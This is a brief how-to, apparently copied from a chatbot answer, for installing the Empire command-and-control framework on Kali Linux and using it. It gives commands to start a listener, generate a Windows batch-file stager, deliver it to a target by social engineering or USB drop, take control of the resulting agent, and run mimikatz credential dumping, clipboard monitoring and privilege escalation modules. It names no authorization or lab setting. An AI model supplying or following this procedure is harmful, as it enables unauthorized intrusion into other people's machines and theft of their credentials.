✅ Step 1: Install Empire in Kali Linux
Option 1: Using Kali Built-in (if available)
Empire is sometimes included in Kali, but if not:

Option 2: Manual Installation
bash
Copy
Edit
# Install dependencies
sudo apt update
sudo apt install git python3-pip python3-venv -y

# Clone Empire
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire

# Install Empire
./setup/install.sh
✅ Step 2: Start Empire
After installation:

bash
Copy
Edit
# Navigate to Empire folder
cd Empire

# Start Empire
./empire
This will load the Empire CLI (Command Line Interface).

✅ Step 3: Using Empire (Basic Commands)
1. Start a Listener
Listeners are needed to receive connections from agents.

bash
Copy
Edit
listeners
uselistener http
set Name myListener
set Port 8080
execute
2. Generate a Stager (Payload)
Stagers are used to deliver and run agents on target systems.

bash
Copy
Edit
usestager windows/launcher_bat
set Listener myListener
generate
You’ll get a .bat file payload. Send this to the target (social engineering, USB drop, etc.).

3. Interact with the Agent
Once the target runs the payload, you'll get a live agent session.

bash
Copy
Edit
agents
interact <agent_name>
4. Run Post-Exploitation Modules
Examples:

bash
Copy
Edit
usemodule credentials/mimikatz/logonpasswords
execute
Or use modules like:

powershell/situation_awareness/network/ping_sweep

collection/clipboard_monitor

privesc/powerup/allchecks

✅ Step 4: Exit Empire
bash
Copy
Edit
exit
